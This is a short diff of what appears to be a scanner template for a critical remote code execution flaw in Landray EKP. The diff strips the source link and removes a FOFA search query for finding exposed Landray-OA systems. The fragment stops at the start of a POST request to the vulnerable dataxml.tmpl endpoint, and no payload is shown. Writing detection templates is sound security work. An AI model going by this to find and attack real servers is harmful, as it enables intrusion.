@@ -3,12 +3,8 @@ info:
   name: 蓝凌 EKP sys-common远程代码执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gp9yp3c6gpvyaxcg'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gp9yp3c6gpvyaxcg
-    fofa: app="Landray-OA系统"
 http:
 - raw:
   - 'POST /ekp/data/sys-common/dataxml.tmpl  HTTP/1.1
